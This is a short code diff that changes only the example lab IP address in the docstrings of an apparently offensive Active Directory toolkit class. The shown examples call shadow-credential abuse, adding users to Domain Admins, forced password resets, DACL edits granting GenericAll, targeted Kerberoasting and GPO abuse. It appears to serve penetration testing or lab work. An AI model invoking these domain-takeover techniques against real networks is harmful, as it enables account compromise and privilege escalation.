@@ -62,7 +62,7 @@ class ACLExploitTools(Toolset):
             Shadow credentials result (includes PFX path if successful)
 
         Example:
-            >>> pywhisker("Administrator", "domain.local", "user", "pass", "192.168.56.10")
+            >>> pywhisker("Administrator", "domain.local", "user", "pass", "192.168.58.10")
         """
         cmd = [
             "pywhisker.py",
@@ -127,7 +127,7 @@ class ACLExploitTools(Toolset):
             Group modification result
 
         Example:
-            >>> bloodyad_add_group_member("controlled_user", "Domain Admins", "domain.local", "user", "pass", "192.168.56.10")
+            >>> bloodyad_add_group_member("controlled_user", "Domain Admins", "domain.local", "user", "pass", "192.168.58.10")
         """
         cmd = [
             "bloodyAD",
@@ -188,7 +188,7 @@ class ACLExploitTools(Toolset):
             Password reset result
 
         Example:
-            >>> bloodyad_set_password("admin_user", "NewP@ssw0rd!", "domain.local", "user", "pass", "192.168.56.10")
+            >>> bloodyad_set_password("admin_user", "NewP@ssw0rd!", "domain.local", "user", "pass", "192.168.58.10")
         """
         cmd = [
             "bloodyAD",
@@ -255,7 +255,7 @@ class ACLExploitTools(Toolset):
             Password change result
 
         Example:
-            >>> force_change_password("victim_user", "NewP@ss123!", "domain.local", "attacker", "pass", "192.168.56.10")
+            >>> force_change_password("victim_user", "NewP@ss123!", "domain.local", "attacker", "pass", "192.168.58.10")
         """
         cmd = [
             "net",
@@ -320,7 +320,7 @@ class ACLExploitTools(Toolset):
             DACL modification result
 
         Example:
-            >>> dacl_edit("CN=Domain Admins,CN=Users,DC=domain,DC=local", "attacker", "GenericAll", "domain.local", "user", "pass", "192.168.56.10")
+            >>> dacl_edit("CN=Domain Admins,CN=Users,DC=domain,DC=local", "attacker", "GenericAll", "domain.local", "user", "pass", "192.168.58.10")
         """
         cmd = [
             "dacledit.py",
@@ -383,7 +383,7 @@ class ACLExploitTools(Toolset):
             Kerberoast hash for the target user
 
         Example:
-            >>> targeted_kerberoast("high_value_user", "domain.local", "attacker", "pass", "192.168.56.10")
+            >>> targeted_kerberoast("high_value_user", "domain.local", "attacker", "pass", "192.168.58.10")
         """
         cmd = [
             "targetedKerberoast.py",
@@ -482,7 +482,7 @@ class ACLExploitTools(Toolset):
             GPO abuse result - success indicates local admin on linked computers
 
         Example:
-            >>> sharpgpoabuse("Workstations Policy", "domain.local", "user", "pass", "192.168.56.10")
+            >>> sharpgpoabuse("Workstations Policy", "domain.local", "user", "pass", "192.168.58.10")
         """
         # Default user_to_add to the current user
         if not user_to_add:
